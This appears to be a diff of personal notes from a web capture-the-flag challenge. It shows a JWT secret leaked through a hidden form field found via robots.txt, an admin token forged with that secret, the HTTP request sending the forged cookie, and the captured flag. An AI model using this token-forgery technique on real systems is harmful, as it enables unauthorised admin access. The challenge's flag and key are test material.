@@ -20,6 +20,10 @@ token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6I
     "role": "user"
 }
 
+http://109.107.157.141:8000/robots.txt
+<input type="hidden" name="secret_key" value="s3cr3t_k3y_f0r_jwt" />
+
+
 jwt encode 
 
 {
@@ -27,23 +31,7 @@ jwt encode
     "role": "admin"
 }
 =>
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MjAxMTY4NjV9.NSIBDXhpmkjAd-a0JdU3QVyWqgBsweReZ7iYH-37xuI
-
-POST /login HTTP/1.1
-Host: 109.107.157.141:8000
-Content-Length: 29
-Cache-Control: max-age=0
-Accept-Language: ja
-Upgrade-Insecure-Requests: 1
-Origin: http://109.107.157.141:8000
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://109.107.157.141:8000/
-Accept-Encoding: gzip, deflate, br
-Connection: keep-alive
-
-username=admin&password=admin
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzIwNDUzMDI3fQ.TrOFgL_mYN-ML7XkifqMPn1qe4BPPcUnhxylTvuYpkc
 
 GET / HTTP/1.1
 Host: 109.107.157.141:8000
@@ -54,7 +42,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Language: ja
 Referer: http://109.107.157.141:8000/
 Accept-Encoding: gzip, deflate, br
-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIifQ.ysbwIYSovR_XiG5_B6IZxq-9sNvTmQQXk4ho8g6S3B8
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzIwNDUzMDI3fQ.TrOFgL_mYN-ML7XkifqMPn1qe4BPPcUnhxylTvuYpkc
 Connection: keep-alive
 
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzIwMTE3NTc2fQ.ysbwIYSovR_XiG5_B6IZxq-9sNvTmQQXk4ho8g6S3B8
+# grodno{r0b0ts_k3y_jwt}
